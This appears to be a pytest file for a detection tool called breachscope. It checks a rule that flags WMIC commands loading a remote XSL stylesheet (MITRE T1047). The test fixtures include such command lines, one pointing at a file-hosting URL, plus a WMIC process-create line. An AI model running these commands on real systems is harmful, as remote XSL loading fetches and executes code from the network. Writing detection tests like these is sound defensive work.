from pathlib import Path

from breachscope.analyzer import apply_rules
from breachscope.rules import load_rules
from breachscope.schemas import Event


ROOT = Path(__file__).resolve().parents[1]


def _rules():
    return load_rules(ROOT / "rules")


def _event(command_line: str, *, event_id: str = "1", source: str = "Microsoft-Windows-Sysmon") -> Event:
    return Event(
        timestamp="2026-09-08T00:00:00Z",
        host="host1",
        source=source,
        event_id=event_id,
        command_line=command_line,
        raw={},
    )


def _has_new_rule(event: Event) -> bool:
    return any(
        finding.rule_id == "R-WMI-XSL-Remote"
        for finding in apply_rules([event], _rules())
    )


def test_exact_external_wmi_xsl_command_matches_despite_double_space() -> None:
    event = _event(
        'wmic  process list /format:"https://a.uguu.se/x50IGVBRfr55_test.xsl"'
    )
    findings = list(apply_rules([event], _rules()))
    matches = [finding for finding in findings if finding.rule_id == "R-WMI-XSL-Remote"]

    assert len(matches) == 1
    assert matches[0].mitre_technique == "T1047"


def test_normal_wmic_query_without_remote_format_does_not_match() -> None:
    assert not _has_new_rule(_event("wmic process get name"))


def test_local_wmic_format_does_not_match() -> None:
    assert not _has_new_rule(_event("wmic process list /format:list"))


def test_remote_format_without_wmic_does_not_match() -> None:
    assert not _has_new_rule(_event('other.exe /format:"https://example.test/a.xsl"'))


def test_wmi_xsl_command_from_wrong_event_id_does_not_match() -> None:
    assert not _has_new_rule(
        _event('wmic process list /format:"https://example.test/a.xsl"', event_id="3")
    )


def test_wmi_xsl_command_from_wrong_provider_does_not_match() -> None:
    assert not _has_new_rule(
        _event(
            'wmic process list /format:"https://example.test/a.xsl"',
            source="Microsoft-Windows-Security-Auditing",
        )
    )


def test_existing_wmi_process_create_rule_still_matches() -> None:
    findings = list(apply_rules([_event("wmic process call create calc.exe")], _rules()))
    assert any(finding.rule_id == "R-WMI-Create" for finding in findings)
